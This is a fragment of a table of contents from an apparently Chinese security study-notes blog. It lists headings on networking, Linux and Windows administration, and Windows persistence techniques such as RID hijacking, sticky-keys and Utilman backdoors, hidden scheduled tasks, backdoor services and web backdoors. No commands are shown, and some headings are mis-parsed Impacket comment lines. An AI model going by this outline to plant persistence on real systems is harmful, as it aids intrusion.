href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IP"><span class="toc-number">2.0.1.</span> <span class="toc-text">IP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MAC%E5%9C%B0%E5%9D%80"><span class="toc-number">2.0.2.</span> <span class="toc-text">MAC地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LAN"><span class="toc-number">2.0.3.</span> <span class="toc-text">LAN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ARP"><span class="toc-number">2.0.4.</span> <span class="toc-text">ARP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DHCP"><span class="toc-number">2.0.5.</span> <span class="toc-text">DHCP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B"><span class="toc-number">2.0.6.</span> <span class="toc-text">七层模型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#vpn"><span class="toc-number">2.0.7.</span> <span class="toc-text">vpn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS"><span class="toc-number">2.0.8.</span> <span class="toc-text">DNS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#whois"><span class="toc-number">2.0.8.1.</span> <span class="toc-text">whois</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%81%E8%A3%85"><span class="toc-number">2.0.9.</span> <span class="toc-text">封装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.0.10.</span> <span class="toc-text">网络协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DHCP-1"><span class="toc-number">2.0.10.1.</span> <span class="toc-text">DHCP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ARP-1"><span class="toc-number">2.0.10.2.</span> <span class="toc-text">ARP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ICMP"><span class="toc-number">2.0.10.3.</span> <span class="toc-text">ICMP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.0.10.4.</span> <span class="toc-text">路由协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NAT"><span class="toc-number">2.0.10.5.</span> <span class="toc-text">NAT</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#s-FTP-s"><span class="toc-number">2.0.10.6.</span> <span class="toc-text">s&#x2F;FTP&#x2F;s</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#sftp"><span class="toc-number">2.0.10.6.1.</span> <span class="toc-text">sftp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ftps"><span class="toc-number">2.0.10.6.2.</span> <span class="toc-text">ftps</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSH"><span class="toc-number">2.0.10.7.</span> <span class="toc-text">SSH</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SMTP-s"><span class="toc-number">2.0.10.8.</span> <span class="toc-text">SMTP&#x2F;s</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pop3-s"><span class="toc-number">2.0.10.9.</span> <span class="toc-text">pop3&#x2F;s</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IMAP-s"><span class="toc-number">2.0.10.10.</span> <span class="toc-text">IMAP&#x2F;s</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSL-TLS"><span class="toc-number">2.0.10.11.</span> <span class="toc-text">SSL&#x2F;TLS</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#wireshark%E8%A7%A3%E5%AF%86"><span class="toc-number">2.0.10.11.1.</span> <span class="toc-text">wireshark解密</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#http-https"><span class="toc-number">2.0.10.12.</span> <span class="toc-text">http&#x2F;https</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wires-hark"><span class="toc-number">2.0.11.</span> <span class="toc-text">wires hark</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tcpdump%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90"><span class="toc-number">2.0.12.</span> <span class="toc-text">tcpdump抓包分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E4%B8%AA%E5%BE%88%E6%96%B9%E4%BE%BF%E7%9A%84%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97%E7%AC%A6%EF%BC%9A"><span class="toc-number">2.0.12.1.</span> <span class="toc-text">三个很方便的逻辑运算符：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E8%A7%A3%E9%87%8A"><span class="toc-number">2.0.12.2.</span> <span class="toc-text">命令													解释</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%BEmac%E8%AE%BF%E9%97%AE"><span class="toc-number">2.0.12.2.1.</span> <span class="toc-text">找mac访问</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%BE%E6%95%B0%E9%87%8F"><span class="toc-number">2.0.12.2.2.</span> <span class="toc-text">找数量</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%BE%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%87%BA%E7%8E%B0%E7%9A%84%E5%9F%9F%E5%90%8D"><span class="toc-number">2.0.12.2.3.</span> <span class="toc-text">找第一个出现的域名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A3%80%E6%B5%8Btcp%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.0.12.2.4.</span> <span class="toc-text">检测tcp连接</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%A3%80%E6%B5%8Btcp%E9%87%8D%E7%BD%AE%EF%BC%88RST"><span class="toc-number">2.0.12.2.4.1.</span> <span class="toc-text">检测tcp重置（RST</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8F%91%E9%80%81%E9%87%8F%E5%A4%A7%E4%BA%8E15000%E5%AD%97%E8%8A%82%E7%9A%84%E6%95%B0%E6%8D%AE%E4%B8%BB%E6%9C%BAIP"><span class="toc-number">2.0.12.2.4.2.</span> <span class="toc-text">发送量大于15000字节的数据主机IP</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8F%91%E9%80%81arp%E8%AF%B7%E6%B1%82%E7%9A%84%E4%B8%BB%E6%9C%BAmac%E5%9C%B0%E5%9D%80"><span class="toc-number">2.0.12.2.4.3.</span> <span class="toc-text">发送arp请求的主机mac地址</span></a></li><li class="toc-item toc-level-6"><a class="toc-link"><span class="toc-number">2.0.12.2.4.4.</span> <span class="toc-text"></span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux"><span class="toc-number">3.</span> <span class="toc-text">Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4"><span class="toc-number">3.1.</span> <span class="toc-text">基础命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#debian-%E5%B7%B2%E5%AE%89%E8%A3%85%E8%BD%AF%E4%BB%B6%E5%8C%85%E5%88%97%E8%A1%A8-dpkg-l"><span class="toc-number">3.2.</span> <span class="toc-text">debian- 已安装软件包列表  - dpkg -l</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9B%B4%E6%94%B9%E9%BB%98%E8%AE%A4shell"><span class="toc-number">3.2.1.</span> <span class="toc-text">更改默认shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#zsh"><span class="toc-number">3.2.1.1.</span> <span class="toc-text">zsh</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FIsh"><span class="toc-number">3.2.1.2.</span> <span class="toc-text">FIsh</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bash"><span class="toc-number">3.2.1.3.</span> <span class="toc-text">bash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shell%E8%84%9A%E6%9C%AC"><span class="toc-number">3.2.1.4.</span> <span class="toc-text">shell脚本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%BE%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1"><span class="toc-number">3.2.2.</span> <span class="toc-text">找端口服务</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AE%E7%AB%AF%E5%8F%A3"><span class="toc-number">3.2.2.1.</span> <span class="toc-text">根据端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AE%E6%9C%8D%E5%8A%A1%E9%83%A8%E5%88%86%E6%89%BE%E5%85%A8%E9%83%A8"><span class="toc-number">3.2.2.2.</span> <span class="toc-text">根据服务部分找全部</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%A1%E6%97%B6%E4%BB%BB%E5%8A%A1cron"><span class="toc-number">3.3.</span> <span class="toc-text">计时任务cron</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows"><span class="toc-number">4.</span> <span class="toc-text">Windows</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE"><span class="toc-number">4.1.</span> <span class="toc-text">系统配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%A1%B9%E7%AE%A1%E7%90%86"><span class="toc-number">4.1.1.</span> <span class="toc-text">启动项管理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UAC"><span class="toc-number">4.1.2.</span> <span class="toc-text">UAC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#computer-manager"><span class="toc-number">4.1.3.</span> <span class="toc-text">computer_manager</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">4.1.3.0.1.</span> <span class="toc-text">计划任务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8B%E4%BB%B6%E6%9F%A5%E7%9C%8B%E5%99%A8"><span class="toc-number">4.1.3.0.2.</span> <span class="toc-text">事件查看器</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6%E5%A4%B9"><span class="toc-number">4.1.3.0.3.</span> <span class="toc-text">共享文件夹</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AE%BE%E5%A4%87%E7%AE%A1%E7%90%86"><span class="toc-number">4.1.3.0.4.</span> <span class="toc-text">设备管理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E4%B8%8E%E5%BA%94%E7%94%A8"><span class="toc-number">4.1.3.0.5.</span> <span class="toc-text">服务与应用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AD%98%E5%82%A8"><span class="toc-number">4.1.3.0.6.</span> <span class="toc-text">存储</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#system-infomation"><span class="toc-number">4.1.4.</span> <span class="toc-text">system_infomation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%84%E6%BA%90%E7%9B%91%E8%A7%86%E5%99%A8"><span class="toc-number">4.1.5.</span> <span class="toc-text">资源监视器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1"><span class="toc-number">4.1.6.</span> <span class="toc-text">基础命令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E4%B8%89%E9%BE%99"><span class="toc-number">4.1.6.1.</span> <span class="toc-text">基础三龙</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E5%90%8E%E7%BC%80%E6%89%93%E5%BC%80"><span class="toc-number">4.1.6.1.1.</span> <span class="toc-text">隐藏后缀打开</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#tasklist"><span class="toc-number">4.1.6.1.2.</span> <span class="toc-text">tasklist</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#shutdown"><span class="toc-number">4.1.6.1.3.</span> <span class="toc-text">shutdown</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cmd%E5%92%8Cpowershell"><span class="toc-number">4.1.6.2.</span> <span class="toc-text">cmd和powershell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#powershell"><span class="toc-number">4.1.6.2.1.</span> <span class="toc-text">powershell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%92%8C%E7%BD%91%E7%BB%9C"><span class="toc-number">4.1.6.2.2.</span> <span class="toc-text">系统和网络</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E6%97%B6%E7%B3%BB%E7%BB%9F%E5%88%86%E6%9E%90"><span class="toc-number">4.1.6.2.3.</span> <span class="toc-text">实时系统分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A7%BB%E5%8A%A8-%E6%9F%A5%E7%9C%8B"><span class="toc-number">4.1.6.2.4.</span> <span class="toc-text">移动+查看</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BB%BA%E7%AB%8B%E6%96%B0%E9%A1%B9%E7%9B%AE-%E5%88%A0%E9%99%A4"><span class="toc-number">4.1.6.2.5.</span> <span class="toc-text">建立新项目+删除</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Where-object%E7%AD%9B%E9%80%89"><span class="toc-number">4.1.6.2.6.</span> <span class="toc-text">Where-object筛选</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CLI"><span class="toc-number">4.1.6.3.</span> <span class="toc-text">CLI</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#set"><span class="toc-number">4.1.6.3.1.</span> <span class="toc-text">set</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ver"><span class="toc-number">4.1.6.3.2.</span> <span class="toc-text">ver</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#systeminfo"><span class="toc-number">4.1.6.3.3.</span> <span class="toc-text">systeminfo</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IP%E7%9B%B8%E5%85%B3"><span class="toc-number">4.1.6.4.</span> <span class="toc-text">IP相关</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#tracert-example-com"><span class="toc-number">4.1.6.4.1.</span> <span class="toc-text">tracert + example.com</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#nslookup"><span class="toc-number">4.1.6.4.2.</span> <span class="toc-text">nslookup</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#netstat"><span class="toc-number">4.1.6.4.3.</span> <span class="toc-text">netstat</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#-1"><span class="toc-number">4.1.6.4.4.</span> <span class="toc-text"></span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8"><span class="toc-number">4.1.7.</span> <span class="toc-text">注册表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-%E6%9B%B4%E6%96%B0"><span class="toc-number">4.1.8.</span> <span class="toc-text">Windows 更新</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81%E6%98%9F%E6%9C%9F%E4%BA%8C%E3%80%82"><span class="toc-number">4.1.8.0.1.</span> <span class="toc-text">补丁星期二。</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows%E5%AE%89%E5%85%A8"><span class="toc-number">4.1.9.</span> <span class="toc-text">Windows安全</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%93%E5%BC%80%E9%98%B2%E7%81%AB%E5%A2%99"><span class="toc-number">4.1.9.0.1.</span> <span class="toc-text">打开防火墙</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AE%BF%E9%97%AE%E4%BF%9D%E6%8A%A4"><span class="toc-number">4.1.9.0.2.</span> <span class="toc-text">浏览器访问保护</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%AF%E4%BF%A1%E5%B9%B3%E5%8F%B0%E6%A8%A1%E5%9D%97-TPM"><span class="toc-number">4.1.9.0.3.</span> <span class="toc-text">可信平台模块( TPM )</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#USB-startup-key"><span class="toc-number">4.1.9.0.4.</span> <span class="toc-text">USB startup key</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#vss%EF%BC%88Volume-Shadow-Copy-Service"><span class="toc-number">4.1.9.0.5.</span> <span class="toc-text">vss（Volume Shadow Copy Service</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%B7%A5%E5%85%B7"><span class="toc-number">4.2.</span> <span class="toc-text">其他工具</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E8%B5%84%E6%BA%90"><span class="toc-number">5.</span> <span class="toc-text">信息搜集+资源</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%8D%E8%B4%B9%E8%AF%81%E4%B9%A6%E7%AD%BE%E5%90%8DTLS"><span class="toc-number">5.1.</span> <span class="toc-text">免费证书签名TLS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">5.2.</span> <span class="toc-text">主机信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A8%81%E8%83%81%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90"><span class="toc-number">5.3.</span> <span class="toc-text">威胁软件分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E8%87%AA%E6%9F%A5"><span class="toc-number">5.4.</span> <span class="toc-text">信息泄露自查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cve%E6%9F%A5%E8%AF%A2"><span class="toc-number">5.5.</span> <span class="toc-text">cve查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BD%E5%A4%96%E7%BD%91%E7%AB%99"><span class="toc-number">5.6.</span> <span class="toc-text">国外网站</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%84%E6%BA%90%E9%87%91%E5%BA%93"><span class="toc-number">5.6.1.</span> <span class="toc-text">资源金库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BD%E5%A4%96%E5%B7%A5%E5%85%B7"><span class="toc-number">5.6.2.</span> <span class="toc-text">国外工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7"><span class="toc-number">5.6.3.</span> <span class="toc-text">提权工具</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Impacket-Collection-of-Python-classes-for-working-with-network-protocols"><span class="toc-number">6.</span> <span class="toc-text">Impacket - Collection of Python classes for working with network protocols.</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#-2"><span class="toc-number">7.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Copyright-C-2022-Fortra-All-rights-reserved"><span class="toc-number">8.</span> <span class="toc-text">Copyright (C) 2022 Fortra. All rights reserved.</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#-3"><span class="toc-number">9.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#This-software-is-provided-under-a-slightly-modified-version"><span class="toc-number">10.</span> <span class="toc-text">This software is provided under a slightly modified version</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#of-the-Apache-Software-License-See-the-accompanying-LICENSE-file"><span class="toc-number">11.</span> <span class="toc-text">of the Apache Software License. See the accompanying LICENSE file</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#for-more-information"><span class="toc-number">12.</span> <span class="toc-text">for more information.</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#-4"><span class="toc-number">13.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Description"><span class="toc-number">14.</span> <span class="toc-text">Description:</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Simple-SMB-Server-example"><span class="toc-number">15.</span> <span class="toc-text">Simple SMB Server example.</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#-5"><span class="toc-number">16.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Author"><span class="toc-number">17.</span> <span class="toc-text">Author:</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Alberto-Solino-agsolino"><span class="toc-number">18.</span> <span class="toc-text">Alberto Solino (@agsolino)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#-6"><span class="toc-number">19.</span> <span class="toc-text"></span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Druva-inSync-6-6-3"><span class="toc-number">19.0.0.0.1.</span> <span class="toc-text">Druva inSync 6.6.3</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">19.1.</span> <span class="toc-text">权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E8%A1%A8"><span class="toc-number">19.1.1.</span> <span class="toc-text">思路表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E9%85%8D%E7%BE%A4%E7%BB%84%E6%88%90%E5%91%98%E8%B5%84%E6%A0%BC"><span class="toc-number">19.1.2.</span> <span class="toc-text">分配群组成员资格</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E5%88%86%E5%88%B0%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%E7%BB%84"><span class="toc-number">19.1.2.1.</span> <span class="toc-text">直接分到管理员权限组</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E5%88%B0%E5%A4%87%E4%BB%BD%E6%93%8D%E4%BD%9C%E5%91%98%E7%BB%84"><span class="toc-number">19.1.2.2.</span> <span class="toc-text">添加到备份操作员组</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%94%A8hash%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5"><span class="toc-number">19.1.2.2.1.</span> <span class="toc-text">用hash桌面连接</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A2%AB%E9%98%BB%E6%AD%A2%EF%BC%8C%E4%B8%8D%E8%AE%A9%E7%99%BB%E5%BD%95"><span class="toc-number">19.1.2.2.2.</span> <span class="toc-text">被阻止，不让登录</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E6%9D%83%E9%99%90%E5%92%8C%E5%AE%89%E5%85%A8%E6%8F%8F%E8%BF%B0"><span class="toc-number">19.1.3.</span> <span class="toc-text">特殊权限和安全描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RID%E5%8A%AB%E6%8C%81"><span class="toc-number">19.1.4.</span> <span class="toc-text">RID劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%94%A8%E6%88%B7RID"><span class="toc-number">19.1.4.1.</span> <span class="toc-text">查看用户RID</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6"><span class="toc-number">19.1.5.</span> <span class="toc-text">后门文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6puttyX-exe"><span class="toc-number">19.1.5.1.</span> <span class="toc-text">可执行文件puttyX.exe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F"><span class="toc-number">19.1.5.2.</span> <span class="toc-text">快捷方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81%E5%85%B3%E8%81%94%E6%96%87%E4%BB%B6"><span class="toc-number">19.1.5.3.</span> <span class="toc-text">劫持关联文件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">19.1.5.3.1.</span> <span class="toc-text">利用方法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E9%97%A8%E6%9C%8D%E5%8A%A1"><span class="toc-number">19.1.6.</span> <span class="toc-text">后门服务</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E6%96%B0%E6%9C%8D%E5%8A%A1"><span class="toc-number">19.1.6.1.</span> <span class="toc-text">创建新服务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E7%8E%B0%E6%9C%89%E6%9C%8D%E5%8A%A1"><span class="toc-number">19.1.6.2.</span> <span class="toc-text">修改现有服务</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1-1"><span class="toc-number">19.1.7.</span> <span class="toc-text">计划任务</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92%E7%A8%8B%E5%BA%8F"><span class="toc-number">19.1.7.1.</span> <span class="toc-text">任务计划程序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%A9%E4%BB%BB%E5%8A%A1%E4%B8%8D%E5%8F%AF%E8%A7%81"><span class="toc-number">19.1.7.2.</span> <span class="toc-text">让任务不可见</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E8%A7%A6%E5%8F%91%E6%8C%81%E4%B9%85%E5%9E%8B"><span class="toc-number">19.1.8.</span> <span class="toc-text">登录触发持久型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E6%96%87%E4%BB%B6%E5%A4%B9"><span class="toc-number">19.1.8.1.</span> <span class="toc-text">启动文件夹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E6%B3%A8%E5%86%8C%E8%A1%A8run"><span class="toc-number">19.1.8.2.</span> <span class="toc-text">写入注册表run</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Winlogon%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F"><span class="toc-number">19.1.8.3.</span> <span class="toc-text">Winlogon操作系统</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E8%84%9A%E6%9C%AC"><span class="toc-number">19.1.8.4.</span> <span class="toc-text">登录脚本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E5%B1%8F%E5%B9%95-rdp%E5%90%8E%E9%97%A8"><span class="toc-number">19.1.9.</span> <span class="toc-text">登录屏幕&#x2F;rdp后门</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%B2%98%E6%BB%9E%E9%94%AE"><span class="toc-number">19.1.9.0.1.</span> <span class="toc-text">粘滞键</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Utilman"><span class="toc-number">19.1.9.0.2.</span> <span class="toc-text">Utilman</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web%E5%90%8E%E9%97%A8"><span class="toc-number">19.1.9.1.</span> <span class="toc-text">web后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mysql%E7%95%99%E7%A0%81"><span class="toc-number">19.1.9.2.</span> <span class="toc-text">mysql留码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" 